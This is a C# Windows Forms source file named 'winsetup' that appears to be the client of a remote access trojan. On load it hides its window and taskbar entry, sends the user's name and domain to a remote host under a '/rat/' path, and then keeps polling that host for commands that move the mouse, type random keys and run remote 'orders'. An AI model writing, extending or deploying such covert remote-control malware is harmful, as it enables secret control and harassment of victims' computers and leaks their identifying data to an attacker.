using HtmlAgilityPack;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace winsetup
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
            web = new HtmlWeb();
        }
        private string localId;
        private Guid id;
        public Guid Guid
        {
            get { return id; }
        }
        private HtmlWeb web;
        string url = "http://s.my.to/rat/rem.html";
        private List<Order> orders = new List<Order>();

        private bool moveMouse = false, randomKeys = false;
        private int mouseIntensity = 1, keyInterval = -1, mouseInterval = -1;

        private Random rnd = new Random();
        private Timer updateTimer;
        private int timeSinceLastUpdate = 0, timeSinceLastMouse = 0, timeSinceLastKey = 0, updateRate = 60;
        
        private void Form1_Load(object sender, EventArgs e)
        {

            this.WindowState = FormWindowState.Minimized;
            this.ShowInTaskbar = false;
            
            if (!File.Exists("config.txt"))
                File.Create("config.txt").Close();
            var arr = File.ReadAllLines("config.txt");

            if (arr.Length > 0)
                localId = arr[0];
            
            if (string.IsNullOrEmpty(localId))
            {
                HtmlWeb web = new HtmlWeb();
                var id = Guid.NewGuid().ToString();
                var data = $"{Environment.UserName};{Environment.UserDomainName};{id.ToString()}";
                var doc = web.Load("http://s.my.to/rat/reg.php?mode=add&dat=" + data);
                File.WriteAllLines("config.txt", new string[] { data });
                localId = data;
            }
            id = new Guid(localId.Split(';')[2]);
            
            updateTimer = new Timer();
            updateTimer.Tick += UpdateTimer_Tick;
            updateTimer.Interval = 10;
            updateTimer.Start();
            Cursor = new Cursor(Cursor.Current.Handle);

            Order.Parent = this;
        }

        private void UpdateTimer_Tick(object sender, EventArgs e)
        {
            timeSinceLastKey += 10;
            timeSinceLastMouse += 10;
            timeSinceLastUpdate += 10;

            if (timeSinceLastUpdate >= updateRate)
            {
                UpdateStatus();
                timeSinceLastUpdate = 0;
            }

            if(moveMouse && timeSinceLastMouse >= mouseInterval)
            {
                Cursor.Position = new Point(Cursor.Position.X + rnd.Next(-mouseIntensity, mouseIntensity), Cursor.Position.Y + rnd.Next(-mouseIntensity, mouseIntensity));
                timeSinceLastMouse = 0;
                if (mouseInterval == -1)
                    timeSinceLastMouse -= rnd.Next(7000);
            }

            if(randomKeys && timeSinceLastKey >= keyInterval)
            {
                SendKeys.SendWait(((char)rnd.Next(48, 126)).ToString());
                timeSinceLastKey = 0;
            }
        }

        private void UpdateStatus()
        {
            var doc = web.Load(url).DocumentNode;
            try
            {
                var el = doc.Element("html").Element("body");
                el = el.Elements("rem").First(x => x.Attributes["uid"].Value == id.ToString());
                moveMouse = el.Attributes["moveMouse"].Value == "true";
                mouseIntensity = int.Parse(el.Attributes["mouseIntensity"].Value);
                mouseInterval = int.Parse(el.Attributes["mouseInterval"].Value);
                randomKeys = el.Attributes["randomKeys"].Value == "true";
                keyInterval = int.Parse(el.Attributes["keyInterval"].Value);

                foreach (var o in orders)
                {
                    if (!o.Executed)
                        o.Execute();
                }
                var remoteLst = new List<Order>();
                el.Elements("order").ToList().ForEach(x => {
                    var o = new Order(int.Parse(x.Attributes["oid"].Value),x.Attributes["type"].Value,x.Attributes["data"].Value);
                    remoteLst.Add(o);
                    if (!orders.Contains(o))
                        orders.Add(o);

                });
                orders.ToList().ForEach(x =>{
                    if (!remoteLst.Contains(x))
                        orders.Remove(x);
                });
                
            }
            catch (Exception)
            {
            }         
        }
    }
}
